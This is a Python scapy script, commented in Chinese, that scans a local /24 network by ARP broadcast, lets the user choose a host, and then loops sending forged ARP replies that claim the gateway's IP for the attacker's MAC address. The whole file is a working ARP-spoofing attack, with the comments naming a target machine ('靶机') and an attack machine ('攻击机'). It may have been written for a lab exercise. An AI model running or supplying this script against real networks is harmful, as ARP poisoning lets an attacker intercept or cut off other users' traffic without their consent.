from scapy.all import *
from scapy.layers.l2 import getmacbyip, Ether, ARP
import re
class Arp(object):
    def __init__(self):
        # 保存扫描结果
        self.num = -1
        self.result = []
        # 网卡
        pattern = re.compile('\[.*?\]')
        self.interFACE = pattern.findall(str(conf.iface))[0].replace('[','').replace(']','')

        # 靶机
        self.target_ip = '192.168.1.4'
        # 本机ip（攻击机）
        self.local_ip = get_ip_from_name(self.interFACE)
        # 网关
        self.gate_ip = "192.168.1.1"

        # 靶机mac
        self.target_mac = ''
        # 本机mac
        self.local_mac = get_if_hwaddr(self.interFACE)     
        # 网关
        self.gate_mac = getmacbyip(self.gate_ip)


    def scan(self):
        p=Ether(dst="ff:ff:ff:ff:ff:ff",src=self.local_mac)/ARP(pdst="192.168.1.0/24")
        ans,unans=srp(p,iface=self.interFACE,timeout=2)
        print("一共扫描到了%d个主机"%len(ans))
        
        for s,r in ans:
            self.result.append([r[ARP].psrc,r[ARP].hwsrc])

        self.result.sort()

        for ip,mac in self.result:
            self.num = self.num + 1
            print(self.num,":",ip,"--->",mac)
            

    def get_target(self):
        while True:
            print("输入主机Id：")
            i = int(input())
            if(i<=self.num):
                self.target_ip = self.result[i][0]
                self.target_mac = self.result[i][1]
                break
            else:
                print("超出范围")
        


    def arpspoof(self):
        
        pack = Ether(dst=self.target_mac,src=self.local_mac)/ARP(op=1,hwsrc=self.local_mac,psrc=self.gate_ip,hwdst=self.target_mac,pdst=self.target_ip)
        sendp(pack,inter=2,iface=self.interFACE)




if __name__ == '__main__':
    myarp = Arp()

    myarp.scan()
    myarp.get_target()

    print("选择了主机：ip: {0}，mac: {1}".format(myarp.target_ip,myarp.target_mac))
    while True:
        try:
            myarp.arpspoof()
            time.sleep(0.5)
        except KeyboardInterrupt:
            print("ARP攻击结束")
            break